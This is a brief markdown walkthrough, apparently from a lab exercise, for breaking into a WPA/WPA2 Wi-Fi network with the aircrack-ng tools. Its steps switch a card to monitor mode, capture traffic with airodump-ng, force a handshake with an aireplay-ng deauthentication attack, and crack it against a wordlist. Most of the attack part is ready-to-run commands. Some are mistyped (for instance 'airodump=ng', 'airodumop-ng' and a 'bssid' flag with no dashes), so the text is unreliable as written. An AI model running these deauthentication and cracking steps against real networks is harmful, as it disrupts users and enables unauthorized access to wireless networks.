# WPAPS2-Exploit-Walkthrough

## Prepare
- connect to VM
```bash
iwconfig
# if "iwconfig" exists -> card is ready
```
### Put in monitor mode
```bash
airmon-ng check kill
# kills all running processes
```
```bash
airmon-ng start wlan0
# confirm with
iwconfig
```
### Search for networks
```bash
airodump=ng wlan0mon
```
-> find network

```
airodump-ng -c 6 bssid <BSSID> -w capture wlan0mon
airodumop-ng -c <channel> bssid <BSSID> -w <filename> <interface>
# -c = Channel
# -w <filename> = write results to file <filename>
```

## Attack
### DeAuth Attack
```bash
aireplay-ng -0 1 -a <BSSID> -c <STATION> <interface>
# -0 = DeAuth Attack
# 1 = 1x
# -a = MAC Address of AP(BSSID)
# -c = station
```
- Might need a few tries
-> Captures Handshake

## Crack the Hash
```bash
aircrack-ng -w <wordlist> -b <bssid> <capture file>
```
